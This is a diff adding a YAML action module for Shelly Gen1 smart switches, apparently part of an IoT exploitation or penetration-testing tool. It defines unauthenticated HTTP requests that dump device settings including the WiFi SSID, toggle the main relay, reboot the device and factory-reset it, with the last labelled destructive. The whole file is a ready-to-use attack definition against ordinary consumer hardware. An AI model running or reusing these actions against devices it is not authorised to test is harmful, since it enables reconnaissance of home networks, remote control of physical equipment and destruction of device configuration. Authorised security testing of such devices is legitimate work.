@@ -1,0 +1,52 @@
+id: shelly-gen1
+device_type: smart_switch
+vendor: Allterco / Shelly
+family: shelly-gen1
+requires:
+  port: 80
+actions:
+  - id: dump-settings
+    label: "Dump full settings (leaks WiFi SSID)"
+    category: recon
+    dangerous: false
+    steps:
+      - http_request:
+          url: "http://{{target.ip}}/settings"
+          save_as: settings
+      - extract:
+          from: $settings
+          fields:
+            device_type: '"type":"([^"]+)"'
+            wifi_ssid: '"ssid":"([^"]+)"'
+            hostname: '"hostname":"([^"]+)"'
+            fw: '"fw":"([^"]+)"'
+            mac: '"mac":"([^"]+)"'
+
+  - id: toggle-relay-0
+    label: "Toggle relay 0 (main)"
+    category: exploit_control
+    dangerous: true
+    steps:
+      - http_request:
+          url: "http://{{target.ip}}/relay/0?turn=toggle"
+          method: POST
+
+  - id: reboot
+    label: "Reboot device"
+    category: exploit_control
+    dangerous: true
+    confirm_prompt: "Reboot the Shelly?"
+    steps:
+      - http_request:
+          url: "http://{{target.ip}}/reboot"
+          method: POST
+
+  - id: factory-reset
+    label: "Factory reset (DESTRUCTIVE)"
+    category: exploit_destructive
+    dangerous: true
+    confirm_prompt: "This wipes the Shelly config and forces re-provisioning. Continue?"
+    steps:
+      - http_request:
+          url: "http://{{target.ip}}/settings/factory_reset"
+          method: POST
